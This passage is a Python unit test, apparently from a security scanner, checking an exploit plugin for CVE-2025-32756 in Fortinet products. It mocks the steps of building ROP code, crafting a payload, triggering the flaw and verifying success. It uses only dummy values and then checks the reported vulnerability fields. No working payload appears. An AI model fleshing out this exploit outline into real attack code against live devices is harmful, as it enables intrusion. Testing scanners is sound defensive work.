    mock_sleep: mock.Mock, exploit_instance: cve_2025_32756.FortinetCVE202532756Exploit
) -> None:
    target = definitions.Target(host="localhost", port=80, scheme="http")
    with (
        mock.patch.object(
            exploit_instance, "_build_exploit_code", return_value=b"dummy_rop_code"
        ) as mock_build,
        mock.patch.object(
            exploit_instance, "_craft_exploit_payload", return_value=b"full_payload"
        ) as mock_craft,
        mock.patch.object(
            exploit_instance, "_trigger_vulnerability", return_value=True
        ) as mock_trigger,
        mock.patch.object(
            exploit_instance, "_verify_exploit_success", return_value=True
        ) as mock_verify,
    ):
        vulnerabilities = exploit_instance.check(target)

        mock_build.assert_called_once()
        mock_craft.assert_called_once_with(b"dummy_rop_code")
        mock_trigger.assert_called_once_with(b"full_payload", target.host, target.port)
        mock_verify.assert_called_once_with(target.host, target.port)

        assert len(vulnerabilities) == 1
        vuln = vulnerabilities[0]
        assert vuln.entry.title == cve_2025_32756.VULNERABILITY_TITLE
        assert vuln.entry.description == cve_2025_32756.VULNERABILITY_DESCRIPTION
        assert vuln.entry.risk_rating == cve_2025_32756.RISK_RATING
        assert vuln.technical_detail is not None
        assert "CVE-2025-32756" in vuln.technical_detail
        assert vuln.vulnerability_location is not None
        assert vuln.dna is not None
